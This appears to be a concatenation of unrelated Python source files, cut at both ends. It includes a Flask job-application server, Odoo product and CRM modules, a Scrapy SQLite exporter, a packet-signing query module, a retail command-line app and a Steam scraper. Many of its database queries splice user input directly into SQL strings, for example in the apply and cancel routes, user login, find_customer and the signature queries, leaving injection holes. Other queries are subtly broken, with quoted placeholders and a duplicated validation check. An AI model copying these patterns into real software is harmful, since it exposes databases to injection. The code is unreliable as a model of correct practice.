        query = '''
        insert into Application
        values (\'''' + session["user_id"] + '\', ' + jid + ', \'' + vtype + '\')'  # Zihan: I tried to use current_user.id here and it returned nothing. So I use session["user_id"] instead.
        g.conn.execute(text(query))
        return render_template("apply.html", jid = jid, vtype = vtype)
    return render_template("apply.html")

# cancel application for the vacancy
@app.route("/canel_apply", methods=["GET", "POST"])
@login_required
def cancel_apply():
    if request.method == 'POST':
        jid = request.form.get('jid')
        vtype = request.form.get('vtype')
        query = '''
        delete from Application
        where uemail=\'''' + session["user_id"] + '\' and jid=' + jid + ' and vtype=\'' + vtype + '\'' 
        g.conn.execute(text(query))
        return render_template("cancel_apply.html", jid = jid, vtype = vtype)
    return render_template("cancel_apply.html")

# some statistic info

# insert job (TBD)

# delete job (TBD)

# update job (TBD)

if __name__ == '__main__':
    import click

    @click.command()
    @click.option('--debug', is_flag=True)
    @click.option('--threaded', is_flag=True)
    @click.argument('HOST', default='0.0.0.0')
    @click.argument('PORT', default=8111, type=int)
    def run(debug, threaded, host, port):
        """
        This function handles command line parameters.
        Run the server using

            python server.py

        Show the help text using

            python server.py --help

        """
        HOST, PORT = host, port
        print "running on %s:%d" % (HOST, PORT)
        app.run(host=HOST, port=PORT, debug=debug, threaded=threaded)

    run()

from flask_login import UserMixin
from flask import g


class User(UserMixin):
    def __init__(self, email='', password='', name=''):
        UserMixin.__init__(self)
        self.email = email
        self.name = name
        self.password = password
        self.valid = False
        self.id = ''  # Extra id field for Flask-login requirement

    # @This Function verify whether a user is recorded
    def user_verify(self):
        eid = self.email
        code = self.password
        if eid.strip() == '':
            return
        if code.strip() == '':
            return
        query = '''select * from usr where email like\''''+eid+'\''                    
        cursor = g.conn.execute(query)                    
        for row in cursor:
            key = str(row.password)
            if key.strip() == code.strip():
                self.name = str(row.name)
                self.email = eid
                self.id = eid
                self.valid = True
            break

    # @This function insert a new user into database
    def insert_new_user(self):
        try:
            query = '''
            insert into usr (email,name,password)
            values (%s,%s,%s)'''
            if self.email.strip() == '' or self.name.strip() == '' or self.name.strip() =='':
                return
            g.conn.execute(query, (self.email, self.name, self.password))
            self.valid = True
            if self.valid:
                self.id = self.email
        except:
            print 'invalid user'

    '''
    Rewrite def in order to get things work
    '''
    def is_authenticated(self):
        if self.valid:
            return True
        return False

    def is_active(self):
        return True

    def get_id(self):
        return self.id



import MySQLdb
import config
class MysqL(object):

    def __init__(self):
        try:
            self.db = MySQLdb.connect(host=config.HOST, user=config.USER, passwd=config.PASSWORD, db=config.DATABASE_NAME)
        except:
            self.db = None
            print 'Error connect'                    

    def mysqlConfirm(self,task_usr,issue,scop):
        if self.db is not None:
            try:
                redminetask = int(task_usr.redmine_id)
                username = task_usr.canonical_name
                email = task_usr.mail
                status = int(issue.status)
                scope =  scop #vpn                    

                cursor = self.db.cursor()
                cursor.execute("""INSERT INTO tasks(redminetask,redmineuser,username,email,scope,status) VALUES (%s,%s,%s,%s,%s,%s)""",(issue.id,redminetask,username,email,scope,status))                    
                self.db.commit()
                print('The data was successfully loaded')
            except:
                print 'Execute Error mysql'                    
                self.db.rollback()

    def mysqlSelect(self):
        if self.db is not None:
            try:
                cursor = self.db.cursor()
                cursor.execute("SELECT * FROM tasks")
                row = cursor.fetchone()
                while row is not None:
                    print(row)                    
                    #r = row[0]
                    row = cursor.fetchone()
            except:
                print ("The data was successfully read")
                self.db.rollback()

    def mysqlClear(self):
        if self.db is not None:
            try:
                cursor = self.db.cursor()
                cursor.execute("DELETE FROM tasks")
                self.db.commit()
                print ('The database has been successfully cleaned')
            except:
                print ('Cleaning databases error!')
                self.db.rollback()

    def mysqlDelete(self,task_id):
        if self.db is not None:
            try:
                sql_str = "DELETE FROM tasks WHERE redminetask = '%s' "
                cursor = self.db.cursor()
                cursor.execute(sql_str, (task_id,))
                self.db.commit()
                print ('The database has been successfully cleaned')
            except:
                print ('Delete databases error!')
                self.db.rollback()

    def mysqlDisconnect(self):
        try:
            self.db.close()
            print ('Disconnect complete successful')
        except:
            print ('Disconnect db error')

if __name__ == '__main__':
    print('Please run to RedmineScript.py')



# -*- coding: utf-8 -*-
# Part of Odoo. See LICENSE file for full copyright and licensing details.
from openerp import api, models, fields
import logging
from datetime import datetime, timedelta

_logger = logging.getLogger(__name__)


class ProductTemplate(models.Model):
    _inherit = "product.template"

    item_code = fields.Char(
        help="Code from bulonfer, not shown",
        select=1
    )
    upv = fields.Integer(
        help='Group Wholesaler'
    )
    wholesaler_bulk = fields.Integer(
        help="Bulk Wholesaler quantity of units",
    )
    retail_bulk = fields.Integer(
        help="Bulk retail quantity of units",
    )
    invalidate_category = fields.Boolean(
        help="True if the asociated category needs rebuild",
        default=False
    )
    # TODO rename to invoice_cost requiere migracion
    system_cost = fields.Float(
        # compute="_compute_system_cost",
        help="Cost price based on the purchase invoice"
    )
    margin = fields.Float(
        help="Margin % from today cost to list price"
    )
    # TODO renombrar a today_cost, require migracion
    bulonfer_cost = fields.Float(
        help="Today cost in product currency, it is automatically updated "
             "when the prices coming from Bulonfer are processed.\n"
             "Or when a price sheet is loaded for no Bulonfer vendors"
    )
    cost_history_ids = fields.One2many(
        comodel_name="stock.quant",
        inverse_name="product_tmpl_id",
        domain=[('location_id.usage', '=', 'internal')]
    )
    parent_price_product = fields.Char(
        help='default_code of the product to get prices from'
    )

    def oldest_quant(self, prod):
        """ Retorna el quant mas antiguo de este producto.
        """
        quant_obj = self.env['stock.quant']
        return quant_obj.search([('product_tmpl_id', '=', prod.id),
                                 ('location_id.usage', '=', 'internal')],
                                order='in_date', limit=1)

    def closest_invoice_line(self, prod, date_invoice):
        """ Encuentra la linea de factura mas cercana a la fecha de ingreso del
            ultimo quant del producto. Si no hay stock busca la mas cercana
            a date_invoice
        """
        in_date = self.oldest_quant(prod).in_date
        if not in_date:
            in_date = date_invoice

        # busca el la linea de factura con prod_id mas cercano a in_date
        # TODO quitar ai.date_invoice para retornar solo los ids

        query = """
            SELECT ail.id, ai.date_invoice                    
            FROM account_invoice_line ail
            INNER JOIN account_invoice ai
              ON ail.invoice_id = ai.id
            INNER JOIN product_product pp
              on ail.product_id = pp.id
            INNER JOIN product_template pt
              on pp.product_tmpl_id = pt.id
            WHERE pt.id = %d AND                    
                  ai.discount_processed = true
            ORDER BY abs(ai.date_invoice - date '%s')                    
            LIMIT 1;
        """ % (prod.id, in_date)                    

        self._cr.execute(query)                    
        # TODO Renombrar a invoice_line_ids
        invoice_lines = self._cr.fetchall()                    

        if invoice_lines:                    
            invoice_lines_obj = self.env['account.invoice.line']
            for invoice_line in invoice_lines:                    
                return invoice_lines_obj.browse(invoice_line[0])
        else:
            return False

    @api.multi
    def set_invoice_cost(self):
        """
            Intenta calcular el system_cost (future invoice_cost) buscando el
            costo en la linea de factura mas cercana al quant mas viejo, si
            no hay stock es la ultima factura.

            Esto vale para cualquier proveedor no solo bulonfer.
        """
        for prod in self:
            # encontrar la factura mas cercana a la fecha de ingreso del quant
            # mas antiguo, si no hay stock intenta traer la ultima factura
            invoice_line = self.closest_invoice_line(
                prod,
                datetime.today().strftime('%Y-%m-%d'))

            invoice_price = 0
            if invoice_line and invoice_line.price_unit:
                # precio que cargaron en la factura de compra
                invoice_price = invoice_line.price_unit
                # descuento en la linea de factura
                invoice_price *= (1 - invoice_line.discount / 100)
                # descuento global en la factura
                invoice_price *= (1 + invoice_line.invoice_discount)

                if invoice_line.invoice_id.partner_id.ref == 'BULONFER':
                    # descuento por nota de credito al final del mes esto
                    # vale solo para bulonfer
                    invoice_price *= (1 - 0.05)

            prod.system_cost = invoice_price
            _logger.info('Setting invoice cost '
                         '$ %d - %s' % (invoice_price, prod.default_code))

    def insert_historic_cost(self, vendor_ref, min_qty, cost,
                             vendors_code, date):                    
        """ Inserta un registro en el historico de costos del producto
        """
        # TODO evitar que se generen registros duplicados aqui

        vendor_id = self.get_vendor_id(vendor_ref)
        # arma el registro para insertar
        supplierinfo = {
            'name': vendor_id.id,
            'min_qty': min_qty,
            'price': cost,
            'product_code': vendors_code,  # vendors product code
            'product_name': self.name,  # vendors product name
            'date_start': date,
            'product_tmpl_id': self.id
        }

        # obtener los registros abiertos deberia haber solo uno o ninguno
        sellers = self.seller_ids.search(
            [('name', '=', vendor_id.id),
             ('product_tmpl_id', '=', self.id),
             ('date_end', '=', False)])

        # restar un dia y cerrar los registros
        for reg in sellers:
            dt = datetime.strptime(date[0:10], "%Y-%m-%d")
            dt = datetime.strftime(dt - timedelta(1), "%Y-%m-%d")
            # asegurarse de que no cierro con fecha < start
            reg.date_end = dt if dt >= reg.date_start else reg.date_start

        # pongo un registro con el precio del proveedor
        self.seller_ids = [(0, 0, supplierinfo)]

    def get_vendor_id(self, vendor_ref):
        # obtiene el vendor_id a partir del vendor_ref
        vendor_id = self.env['res.partner'].search(
            [('ref', '=', vendor_ref)])
        if not vendor_id:
            raise Exception('Vendor %s not found' % vendor_ref)
        return vendor_id

    @api.multi
    def set_prices(self, cost, vendor_ref, price=False, date=False, min_qty=1,
                   vendors_code=False):                    
        """ Setea el precio, costo y margen (no bulonfer) del producto

            - Si el costo es cero y es bulonfer se pone obsoleto y termina.
            - Agrega una linea al historico de costos
            - Si no hay quants en stock standard_price = cost
            - bulonfer_cost = cost
            - Si es bulonfer list_price = cost * (1 + margin)
            - Si no es bulonfer list_price = price
        """
        # TODO ver si se puede hacer esto mas arriba o sea cuando recibo el
        # registro de data.csv para que no llegue aca.
        # TODO marcar los obsoletos con un color
        self.ensure_one()
        for prod in self:
            # si el costo es cero y es bulonfer pongo como obsoleto y termino
            if not cost and vendor_ref == 'BULONFER':
                prod.state = 'obsolete'
                return
            prod.state = 'sellable'

            if not date:
                date = datetime.today().strftime('%Y-%m-%d')

            # agrega una linea al historico de costos
            self.insert_historic_cost(vendor_ref, min_qty, cost, vendors_code,
                                      date)

            # buscar si hay quants
            quant = self.oldest_quant(prod)
            self.fix_quant_data(quant, prod, cost)

            prod.bulonfer_cost = cost

            if vendor_ref == 'BULONFER':
                item_obj = self.env['product_autoload.item']
                item = item_obj.search([('code', '=', prod.item_code)])

                prod.margin = 100 * item.margin
                prod.list_price = cost * (item.margin + 1)
            else:
                prod.list_price = price
                prod.margin = 100 * (price / cost - 1) if cost != 0 else 1e10

    def fix_quant_data(self, quant, prod, cost):
        """ Overrideable function
        """
        if not quant:
            # si no hay quants el costo es el de hoy
            prod.standard_price = cost

    @api.model
    def get_price_from_product(self):
        """ Procesar los productos que tienen el parent_price_product asignado
            Se lanza desde cron despues de que corre el autoload
        """
        prod_obj = self.env['product.template']

        # Busco los que tienen parent price product
        prods = prod_obj.search([('parent_price_product', '!=', False)])
        for prod in prods:
            default_code = prod.parent_price_product
            parent = prod_obj.search([('default_code', '=', default_code)])
            # si ya tiene bien el precio no lo proceso para que no me quede
            # en el historico de precios.
            if parent and parent.list_price != prod.list_price:
                # imaginamos que el costo es la decima parte.
                cost = parent.list_price / 10
                prod.set_prices(cost, 'EFACEC', price=parent.list_price)
                _logger.info('setting price product %s' % prod.default_code)

"""
Item Exporters are used to export/serialize items into sqlite3 database.
"""

from scrapy.exporters import BaseItemExporter
import sqlite3


class SqliteWebpageExporter(BaseItemExporter):
    def __init__(self, file, **kwargs):
        self._configure(kwargs)
        self.conn = sqlite3.connect(file.name)
        self.conn.execute(r"""CREATE TABLE IF NOT EXISTS `webpages`(
                                                    `id` INTEGER PRIMARY KEY,
                                                    `title` VARCHAR DEFAULT NULL,
                                                    `content` VARCHAR DEFAULT NULL,
                                                    `url` VARCHAR DEFAULT NULL UNIQUE 
                                                  );
                                             """)
        self.conn.commit()
        self.conn.text_factory = str

    def export_item(self, item):
        self.start_exporting()
        self.conn.execute(r"""INSERT INTO webpages(title, content, url) VALUES ('%s', '%s', '%s')""" %                    
                          (item['title'], item['content'], item['url']))
        self.conn.commit()
        self.finish_exporting()

    def __del__(self):
        self.conn.close()

# -*- coding: utf-8 -*-
# Copyright (C) 2004-today OpenERP SA (<http://www.openerp.com>)
# Copyright (C) 2017 Tecnativa - Vicent Cubells
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl).

from openerp import api, fields, models


class CrmLead(models.Model):
    _inherit = "crm.lead"

    phonecall_ids = fields.One2many(
        comodel_name='crm.phonecall',
        inverse_name='opportunity_id',
        string='Phonecalls',
    )
    phonecall_count = fields.Integer(
        compute='_phonecall_count',                    
        string="Phonecalls",
    )

    @api.multi
    def _phonecall_count(self):                    
        for lead in self:
            lead.phonecall_count = self.env[
                'crm.phonecall'].search_count(
                [('opportunity_id', '=', lead.id)])

# -*- coding: utf-8 -*-
# Copyright 2004-2010 Tiny SPRL (<http://tiny.be>)
# Copyright 2017 Tecnativa - Vicent Cubells
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl).

from odoo import tools
from odoo import api, fields, models

AVAILABLE_STATES = [
    ('draft', 'Draft'),
    ('open', 'Todo'),
    ('cancel', 'Cancelled'),
    ('done', 'Held'),
    ('pending', 'Pending')
]


class CrmPhonecallReport(models.Model):
    _name = "crm.phonecall.report"
    _description = "Phone calls by user"
    _auto = False

    user_id = fields.Many2one(
        comodel_name='res.users',
        string='User',
        readonly=True,
    )
    team_id = fields.Many2one(
        comodel_name='crm.team',
        string='Team',
        readonly=True,
    )
    priority = fields.Selection(
        selection=[
            ('0', 'Low'),
            ('1', 'Normal'),
            ('2', 'High')
        ],
        string='Priority',
    )
    nbr_cases = fields.Integer(
        string='# of Cases',
        readonly=True,
    )
    state = fields.Selection(
        AVAILABLE_STATES,
        string='Status',
        readonly=True,
    )
    create_date = fields.Datetime(
        string='Create Date',
        readonly=True,
        index=True,
    )
    delay_close = fields.Float(
        string='Delay to close',
        digits=(16, 2),
        readonly=True,
        group_operator="avg",
        help="Number of Days to close the case",
    )
    duration = fields.Float(
        string='Duration',
        digits=(16, 2),
        readonly=True,
        group_operator="avg",
    )
    delay_open = fields.Float(
        string='Delay to open',
        digits=(16, 2),
        readonly=True,
        group_operator="avg",
        help="Number of Days to open the case",
    )
    partner_id = fields.Many2one(
        comodel_name='res.partner',
        string='Partner',
        readonly=True,
    )
    company_id = fields.Many2one(
        comodel_name='res.company',
        string='Company',
        readonly=True,
    )
    opening_date = fields.Datetime(
        readonly=True,
        index=True,
    )
    date_closed = fields.Datetime(
        string='Close Date',
        readonly=True,
        index=True)

    def _select(self):
        select_str = """
            select
                id,
                c.date_open as opening_date,
                c.date_closed as date_closed,
                c.state,
                c.user_id,
                c.team_id,
                c.partner_id,
                c.duration,
                c.company_id,
                c.priority,
                1 as nbr_cases,
                c.create_date as create_date,
                extract(
                  'epoch' from (
                  c.date_closed-c.create_date))/(3600*24) as delay_close,
                extract(
                  'epoch' from (
                  c.date_open-c.create_date))/(3600*24) as delay_open
           """
        return select_str

    def _from(self):
        from_str = """
            from crm_phonecall c
        """
        return from_str

    @api.model_cr
    def init(self):

        tools.drop_view_if_exists(self._cr, self._table)
        self._cr.execute("""                    
            create or replace view %s as (
                %s
                %s
            )""" % (self._table, self._select(), self._from()))                    

from collections import namedtuple
from logging import getLogger

from sqlalchemy import exc

from .models import db, REQUIRED_MISC_SIGNATURES
from .packet import get_number_required, get_misc_signatures

LOGGER = getLogger(__name__)


def current_packets(member, intro=False, onfloor=False):
    """
    Get a list of currently open packets with the signed state of each packet.
    :param member: the member currently viewing all packets
    :param intro: true if current member is an intro member
    :param other: true if current member is off floor or alumni
    :return: <tuple> a list of packets that are currently open, and their attributes
    """

    # Tuple for compatibility with UI code.  Should be refactored or deleted altogether later
    SPacket = namedtuple('spacket', ['rit_username', 'name', 'did_sign', 'total_signatures', 'required_signatures'])

    packets = []
    required = get_number_required()

    if intro and onfloor:
        required -= 1

    signed_packets = get_signed_packets(member, intro, onfloor)
    misc_signatures = get_misc_signatures()

    try:                    
        for pkt in query_packets_with_signed():
            signed = signed_packets.get(pkt.username)
            misc = misc_signatures.get(pkt.username)
            if signed is None:
                signed = False
            if misc is None:
                misc = 0
            if misc > REQUIRED_MISC_SIGNATURES:
                misc = REQUIRED_MISC_SIGNATURES
            packets.append(SPacket(pkt.username, pkt.name, signed, pkt.received + misc, required))

    except exc.SQLAlchemyError as e:
        LOGGER.error(e)
        raise e

    return packets


def get_signed_packets(member, intro=False, onfloor=False):
    """
    Get a list of all packets that a member has signed
    :param member: member retrieving prior packet signatures
    :param intro: is the member an intro member?
    :param onfloor: is the member on floor?
    :return: <dict> usernames mapped to signed status
    """
    signed_packets = {}

    try:                    
        if intro and onfloor:
            for signature in query_signed_intromember(member):
                signed_packets[signature.username] = signature.signed

        if not intro:
            if onfloor:
                for signature in query_signed_upperclassman(member):
                    signed_packets[signature.username] = signature.signed

            else:
                for signature in query_signed_alumni(member):
                    signed_packets[signature.username] = bool(signature.signed)

    except exc.SQLAlchemyError as e:
        LOGGER.error(e)
        raise e

    return signed_packets


def query_packets_with_signed():
    """
    Query the database and return a list of currently open packets and the number of signatures they currently have
    :return: a list of results: intro members with open packets, their name, username, and number of signatures received
    """
    try:                    
        return db.engine.execute("""                    
        SELECT packets.username AS username, packets.name AS name, coalesce(packets.sigs_recvd, 0) AS received 
         FROM ( ( SELECT freshman.rit_username 
         AS username, freshman.name AS name, packet.id AS id, packet.start AS start, packet.end AS end 
         FROM freshman INNER JOIN packet ON freshman.rit_username = packet.freshman_username) AS a 
                       LEFT JOIN (  SELECT totals.id  AS id, coalesce(sum(totals.signed), 0)  AS sigs_recvd 
                       FROM ( SELECT packet.id AS id, coalesce(count(signature_fresh.signed), 0) AS signed 
                       FROM packet FULL OUTER JOIN signature_fresh ON signature_fresh.packet_id = packet.id 
                       WHERE signature_fresh.signed = TRUE  AND packet.start < now() AND now() < packet.end 
                       GROUP BY packet.id 
                       UNION SELECT packet.id AS id, coalesce(count(signature_upper.signed), 0) AS signed FROM packet 
                       FULL OUTER JOIN signature_upper ON signature_upper.packet_id = packet.id 
                       WHERE signature_upper.signed = TRUE AND packet.start < now() AND now() < packet.end 
                       GROUP BY packet.id ) totals GROUP BY totals.id ) AS b ON a.id = b.id ) AS packets 
                       WHERE packets.start < now() AND now() < packets.end; 
                                """)

    except exc.SQLAlchemyError:
        raise exc.SQLAlchemyError("Error: Failed to get open packets with signatures received from database")


def query_signed_intromember(member):
    """
    Query the database and return the list of packets signed by the given intro member
    :param member: the user making the query
    :return: list of results matching the query
    """
    try:                    
        return db.engine.execute("""                    
            SELECT DISTINCT packet.freshman_username AS username, signature_fresh.signed AS signed FROM packet 
            INNER JOIN signature_fresh ON packet.id = signature_fresh.packet_id 
            WHERE signature_fresh.freshman_username = '""" + member + "';")                    

    except exc.SQLAlchemyError:
        raise exc.SQLAlchemyError("Error: Failed to get intromember's signatures from database")


def query_signed_upperclassman(member):
    """
    Query the database and return the list of packets signed by the given upperclassman
    :param member: the user making the query
    :return: list of results matching the query
    """
    try:                    
        return db.engine.execute("""                    
            SELECT DISTINCT packet.freshman_username AS username, signature_upper.signed AS signed FROM packet 
            INNER JOIN signature_upper ON packet.id = signature_upper.packet_id 
            WHERE signature_upper.member = '""" + member + "';")                    

    except exc.SQLAlchemyError:
        raise exc.SQLAlchemyError("Error: Failed to get upperclassman's signatures from database")


def query_signed_alumni(member):
    """
    Query the database and return the list of packets signed by the given alumni/off-floor
    :param member: the user making the query
    :return: list of results matching the query
    """
    try:                    
        return db.engine.execute("""                    
            SELECT DISTINCT packet.freshman_username AS username, signature_misc.member AS signed 
            FROM packet LEFT OUTER JOIN signature_misc ON packet.id = signature_misc.packet_id 
            WHERE signature_misc.member = '""" + member + "' OR signature_misc.member ISNULL;")                    

    except exc.SQLAlchemyError:
        raise exc.SQLAlchemyError("Error: Failed to get alumni's signatures from database")

"""
desc: application for end users to access retail data
"""
import queries
import configparser
import customer_commands
import help_functions                    


def init():
    # init database and what not
    config = configparser.ConfigParser()
    config.read('config.ini')
    return queries.Query(
        host     = config['database']['host'],
        dbname   = config['database']['dbname'],
        user     = config['database']['user'],
        password = config['database']['pass']
    )


def handle_query(tokens, id, query):
    # handle each type of queries

    commands = {
        "help":     customer_commands.process_help,
        "id":       customer_commands.process_id,
        "purchase": customer_commands.process_purchase,
        "brand":    customer_commands.process_brand,
        "itemtype": customer_commands.process_type,
        "userinfo": customer_commands.process_userinfo,
        "lookup":   customer_commands.process_lookup                    
    }

    command = commands.get(tokens[0], "invalid")
    if command == "invalid":
        print("\tinvalid command \"" + tokens[0] + "\"")
    else:
        command(id, tokens[1:], query)


def create_new_user(username, query):
    print("first name: ", end="")
    fname = input()
    print("last name: ", end="")
    lname = input()
    print("phone number (xxxxxxxxxxx): ", end="")
    phone = input()
    phone = int(phone) if phone.isdigit() else None
    print("email: ", end="")
    email = input()
    print("street address: ", end="")
    street = input()
    print("city: ", end="")
    city = input()
    print("state: ", end="")
    state = input()
    print("zipcode: ", end="")
    zip = input()
    zip = int(zip) if zip.isdigit() else None
    print("country: ", end="")
    country = input()

    # create new user with (username, fname, lname, phone, email, addr)
    #return new id

    query.cursor.execute(
        'SELECT MAX(frequent_shopper_id) FROM customer;'
    )

    freq_shop_id = query.cursor.fetchone()[0] + 1

    query.cursor.execute(
        'INSERT INTO customer (first_name, last_name, phone_number, username, email, frequent_shopper_id) VALUES (%s, %s, %s, %s, %s, %s) RETURNING id;',
        (fname, lname, phone, username, email, freq_shop_id)
    )

    customer_id = query.cursor.fetchone()[0]

    query.cursor.execute(
        'INSERT INTO address (address_line, zipcode, city, state, country) VALUES (%s, %s, %s, %s, %s) RETURNING id;',
        (street, zip, city, state, country)
    )

    address_id = query.cursor.fetchone()[0]

    query.cursor.execute(
        'INSERT INTO customer_to_address (customer_id, address_id) VALUES (%s, %s);',
        (customer_id, address_id)
    )

    query.commit()

    print("user " + username + " created ‚úì")
    return freq_shop_id                    


def username_to_id(username, query):
    user = query.find_customer(username)                    

    if user is not None:
        print("Welcome Back", user[1], user[2])
        return user[7]                    

    return create_new_user(username, query)


def get_customer_id(query):
    print("username: ", end="")
    username = input()

    while len(username) == 0:
        print("username must exceed zero characters.\nusername: ", end="")
        username = input()

    return username_to_id(username, query)


def main():
    query = init()
    print("##################################")
    print("#       retail application       #")
    print("##################################")
    id = get_customer_id(query)                    
    print("\n     type 'help' for query info")
    print("     enter 'quit' to exit\n")
    print(">", end="")
    line = input()
    line.replace("\\s*", " ")
    tok = line.split()
    while len(tok) > 0 and tok[0] != "quit" and tok[0] != "exit":
        handle_query(tok, id, query)
        print(">", end="")
        line = input()
        line = line.replace("\\s*", " ")
        tok = line.split()


if __name__ == "__main__":
    main()

import help_functions
import tabulate


def process_help(id, tokens, query):
    help_functions.display_help(tokens)


def process_purchase(id, tokens, query):
    # query for purchase data and print results
    print("\tpurchase command " + str(tokens))
    pass                    


def process_id(id, tokens, query):
    # query for item lookup by id
    if len(tokens) == 0:
        print("\tusage: id [item id]")
        return

    products = query.find_product_by_id(tokens[0])

    if products is None or len(products) == 0:
        print("\tNo products found")
    else:
        print(tabulate.tabulate([("UPC", "Name", "Weight", "Description")] + products))


def process_brand(id, tokens, query):
    # query for brand data and print results
    if len(tokens) == 0:
        print("\tusage: brand [brand name|brand id]")
        return

    brand = query.find_brand_by_id(tokens[0]) if tokens[0].isdigit() else query.find_brand_by_name(tokens[0])

    if len(brand) == 0:
        print("\tNo brands found")
    else:
        print(tabulate.tabulate([("id", "Brand Name")] + brand))


def process_type(id, tokens, query):
    # query for type data and print results
    print("\ttype command " + str(tokens))
    pass                    


def process_lookup(id, tokens, query):
    # query for item data and print results

    if len(tokens) == 0:
        print("\tusage: lookup [item name|item id|keyword|UPC]")
        return

    products = query.find_products_by_name(tokens[0])
    products += query.find_products_by_desc(tokens[0])
    products += query.find_products_by_upc(tokens[0])

    if products is None or len(products) == 0:
        print("\tNo products found")
    else:
        print(tabulate.tabulate([("UPC", "Name", "Weight", "Description")] + products))


def process_userinfo(id, tokens, query):
    # query for current user data and print results
    print("\tuserinfo command id=" + str(id))                    
    pass                    

"""
All queries and commands that the user makes in the retail application
"""
import psycopg2

ONLINE_STORE_ID = 1


class Query:
    def __init__(self, dbname, user, password, host, port=5432):
        self.db_conn = psycopg2.connect(
            host = host,
            dbname = dbname,
            user = user,
            password = password,
            port = port
        )
        self.cursor = self.db_conn.cursor()

    def commit(self):
        self.db_conn.commit()

    def __del__(self):
        self.cursor.close()
        self.db_conn.close()
    
    def login(self, customer_id):
        self.customer_id = customer_id
    
    def find_product_by_id(self, product_id):
        self.cursor.execute(
            'SELECT upc, name, weight, description FROM product WHERE id = \'%s\';',
            (product_id,)
        )
        return self.cursor.fetchall()

    def find_products_by_desc(self, product_desc):
        self.cursor.execute(
            'SELECT upc, name, weight, description FROM product WHERE description ILIKE \'%%%s%%\';',                    
            (product_desc,)                    
        )
        return self.cursor.fetchall()
    
    def find_products_by_name(self, product_name):
        self.cursor.execute(
            'SELECT upc, name, weight, description FROM product WHERE name ILIKE \'%%%s%%\';',                    
            (product_name,)                    
        )
        return self.cursor.fetchall()
    
    def find_products_by_upc(self, product_upc):
        self.cursor.execute(
            'SELECT upc, name, weight, description FROM product WHERE upc ILIKE \'%%%s%%\';',                    
            (product_upc,)                    
        )
        return self.cursor.fetchall()

    def find_product_by_type(self, product_type):
        self.cursor.execute("""
            SELECT *
            FROM product
            WHERE id IN (
                SELECT product_id
                FROM product_to_types
                WHERE product_type_id = %s
            )
            """, (product_type,)
        )
        return self.cursor.fetchall()
    
    def find_brand_by_id(self, brand_id):
        self.cursor.execute(
            'SELECT * FROM brand WHERE id = %s;',
            (brand_id,)
        )
        return self.cursor.fetchall()
    
    def find_brand_by_name(self, brand_name):
        self.cursor.execute(
            'SELECT * FROM brand WHERE name ILIKE \'%' + brand_name + '%\';'
        )
        return self.cursor.fetchall()
    
    def find_type_by_name(self, type_name):
        self.cursor.execute(
            'SELECT * FROM product_type WHERE name = %s;',
            (type_name,)
        )
        return self.cursor.fetchone()

    def _purchase_by_product(self, product, quantity):
        """Internal API, do not use externally"""

        # verify our store sells this product
        product_id = product[0]
        store_id = ONLINE_STORE_ID
        customer_id = self.customer_id
        self.cursor.execute("""
            SELECT product_id
            FROM store_sells_product
            WHERE product_id = %s
            AND store_id = %s;
            """,
            (product_id, store_id,)
        )
        results = self.cursor.fetchall()
        if len(results) == 0:
            # we don't sell this product
            raise Exception('Sorry, we do not sell this product in the store!')
        
        # create a purchase
        self.cursor.execute("""
            WITH current_purchase AS (
                INSERT INTO purchase (datetime, store_id, customer_id)
                VALUES (NOW(), %(store_id)s, %(customer_id)s)
                RETURNING id AS purchase_id
            )
            INSERT INTO product_in_purchase (product_id, purchase_id)
            VALUES (%(product_id)s, (SELECT purchase_id FROM current_purchase));
            """,
            {
                'store_id': store_id,
                'customer_id': customer_id,
                'product_id': product_id
            }
        )
        
        self.db_conn.commit()

    def purchase_by_product_id(self, product_id, quantity):
        product = self.find_product_by_id(product_id)
        self._purchase_by_product(product, quantity)

    def purchase_by_product_name(self, product_name, quantity):
        product = self.find_products_by_name(product_name)
        self._purchase_by_product(product, quantity)

    def purchase_by_product_upc(self, product_upc, quantity):
        product = self.find_products_by_upc(product_upc)
        self._purchase_by_product(product, quantity)

    def find_customer(self, username):                    
        self.cursor.execute(
            'SELECT * FROM customer WHERE LOWER(username) = LOWER(\'' + username + '\');'
        )
        return self.cursor.fetchone()

import odbc
from datetime import datetime
from time import sleep
import Checker
import requests
from bs4 import BeautifulSoup


def monthConvertor(month):
    return {
        'Jan': '1',
        'Feb': '2',
        'Mar': '3',
        'Apr': '4',
        'May': '5',
        'Jun': '6',
        'Jul': '7',
        'Aug': '8',
        'Sep': '9',
        'Oct': '10',
        'Nov': '11',
        'Dec': '12'
    }[month]


def cleanDate(date):
    if (date == ''):
        return '0000-00-00'
    date = date.replace(',', '')
    date = date.replace('.', '')
    date = date.split(' ')
    if (len(date) < 3):
        return '0000-00-00'
    if ('th' in date[1]):
        result = date[2] + '-' + monthConvertor(date[0][0:3]) + '-' + date[1].replace('th', '')
    elif (date[1].isdigit()):
        result = date[2] + '-' + monthConvertor(date[0]) + '-' + date[1]
    else:
        result = date[2] + '-' + monthConvertor(date[1]) + '-' + date[0]
    return result


def datePass():
    now = datetime.now()
    result = "%s-%s-%s %s:%s:%s" % (now.year, now.month, now.day, now.hour, now.minute, now.second)
    return result


def cleanStr(str, isDiscounted):
    result = str.replace('\t', '')
    result = result.replace('\r', '')
    result = result.replace('\n', '')
    result = result.replace('‚Ç©', '')
    result = result.replace(',', '')
    if (result == ''):
        return 0
    result = result.split()
    if (len(result) == 2 and isDiscounted):
        if (result[1] == 'Free'):
            return 0
        elif(result[1].isdigit()==False):
            return 0
        return int(result[1])  # return discounted price
    else:
        if (result[0] == 'Free'):
            return 0
        elif (result[0].isdigit()==False):
            return 0
        return int(result[0])  # return original price


def cleanID(id, isTitle):
    result = id.get('href')
    if (isTitle == False):
        return result.split('/')[4]  # return id_num (number)
    elif (result.split('/')[3] == 'app'):
        return result.split('/')[5]  # return id_title (string)
    else:
        return 'NONE'


page = 1
games = []
date = datePass()

for page in range(1, 41):
    # sleep(0.1)
    # parsing
    url = 'https://store.steampowered.com/search/?category1=998&filter=topsellers&page=' + str(page)
    req = requests.get(url)
    html = req.text
    soup = BeautifulSoup(html, 'html.parser')

    titles = soup.select(
        'div.responsive_search_name_combined > div.col.search_name.ellipsis > span'
    )
    release_dates = soup.select(
        'div.responsive_search_name_combined > div.col.search_released.responsive_secondrow'
    )
    prices = soup.select(
        'div.responsive_search_name_combined > div.col.search_price_discount_combined.responsive_secondrow > div.col.search_price.responsive_secondrow'
    )
    links = soup.select(
        '#search_result_container > div > a'
    )

    for i in range(0, 25):
        games.append({'rank': int(i + 1 + (page - 1) * 25),
                      'title': titles[i].text,                    
                      'release': cleanDate(release_dates[i].text),
